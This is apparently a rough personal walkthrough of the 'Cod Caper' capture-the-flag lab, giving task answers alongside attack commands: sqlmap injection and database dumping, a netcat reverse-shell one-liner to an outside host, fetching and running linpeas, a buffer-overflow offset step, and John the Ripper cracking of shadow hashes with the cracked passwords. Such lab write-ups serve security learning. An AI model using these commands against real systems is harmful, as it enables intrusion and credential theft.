# Machine NAME : The Cod Caper
# Machine IP : 10.10.110.116

***TASK 1 : Intro***

***TASK 2 : Host Enumeration***
1. How many ports are open on the target machine? : 2 <br>
2. What is the http-title of the web server? : Apache2 Ubuntu Default Page: It works <br>
3. What version is the ssh service? : OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <br>
4. What is the version of the web server? : Apache/2.4.18 <br>

***TASK 3: Web Enumeration***<br>
1. What is the name of the important file on the server? <br>
: /administrator.php <br>

***TASK 4: Web Exploitation***<br>
1.sqlmap -u {IP} --data "username=&password="  --form <br>
2.sqlmap -u {IP} --data "username=&password=" --data 'username=&password='-a  <br>
 &nbsp;2.1 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y<br>
 &nbsp;2.2. do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y<br>
 &nbsp;2.3. what dictionary do you want to use : 1<br>
  &nbsp;&nbsp; [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)<br>
  &nbsp;&nbsp; [2] custom dictionary file<br>
  &nbsp;&nbsp; [3] file with list of dictionary files<br>
  &nbsp; 2.4. do you want to use common password suffixes? (slow!) [y/N] N<br>
3.sqlmap -u http://{IP}/administrator.php --data 'username=&password=' --dbs<br>
4.sqlmap -u http://10.10.223.60/administrator.php --data "username=&password=" -D users --tables<br>
5.sqlmap -u http://10.10.223.60/administrator.php --data "username=&password=" -D users -T users --dump<br>

1.What is the admin username? : pingudad<br>
2.What is the admin password? : secretpass<br>
3.How many forms of SQLI is the form vulnerable to? 3<br>


***TASK 5: Command Execution***<br>
1.How many files are in the current directory? 3<br>
2.Do I still have an account : yes<br>

3 What is my ssh password? :pinguapingu<br>
&nbsp; 3.1 reverse shell command<br>
       - Listen Command : nc -lvnp 4444<br>
       - reverse shell connect command : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f<br>
       - I thinked for find ssh password<br>
       - 1st See that log file ...if the "/var" directory?<br>
       - ssh password is<br>

***TASK 6: LinEnum***<br>
1. What is the interesting path of the interesting suid file? : /opt/secret/root<br>
- python3 -m http.server 780<br>
- wget http://{IP}/linpeas.sh<br>
- ./linpeas.sh <br>

***TASK 7: pwndbg***<br>
***TASK 8: Binary-Exploitation : Manually***<br>
***TASK 9: Binary-Exploitation : The pwntools way***<br>
1. cyclic 50<br>
2. echo "cyclic 50" | ./root2<br>
3. check the hex value : dmesg<br>
4. python2 ./cylic -l bytes<br>

***Task 10: Finishing the job*** <br>
1.papa crack passwd file using john the ripper<br>
 #john --wordlist=/usr/share/wordlists/rockyou.txt shadow<br>
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"<br>
Use the "--format=md5crypt-long" option to force loading these as that type instead<br>
Using default input encoding: UTF-8<br>
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])<br>
Press 'q' or Ctrl-C to abort, almost any other key for status<br>
***postman          (papa)***<br>
1g 0:00:00:00 DONE (2020-05-27 17:22) 1.886g/s 40754p/s 40754c/s 40754C/s spices..playball<br>
Use the "--show" option to display all of the cracked passwords reliably<br>
Session completed<br>

2.root crack passwd file using john the ripper<br>
#john --wordlist=/usr/share/wordlists/rockyou.txt shadow                                                     <br>
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"<br>
Use the "--format=md5crypt" option to force loading hashes of that type instead<br>
Using default input encoding: UTF-8<br>
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])<br>
Cost 1 (iteration count) is 5000 for all loaded hashes<br>
Press 'q' or Ctrl-C to abort, almost any other key for status<br>
0g 0:00:00:07 0.04% (ETA: 23:00:56) 0g/s 872.7p/s 872.7c/s 872.7C/s horoscope..crazy8<br>
0g 0:00:01:50 0.46% (ETA: 00:09:43) 0g/s 724.4p/s 724.4c/s 724.4C/s alex55..Bulldog<br>
0g 0:00:01:51 0.47% (ETA: 00:09:03) 0g/s 725.6p/s 725.6c/s 725.6C/s vivita..tazzman<br>
***love2fish        (root)***<br>
1g 0:00:04:57 DONE (2020-05-27 17:39) 0.003366g/s 807.5p/s 807.5c/s 807.5C/s lovelife07..lossims
Use the "--show" option to display all of the cracked passwords reliably<br>
Session completed<br>


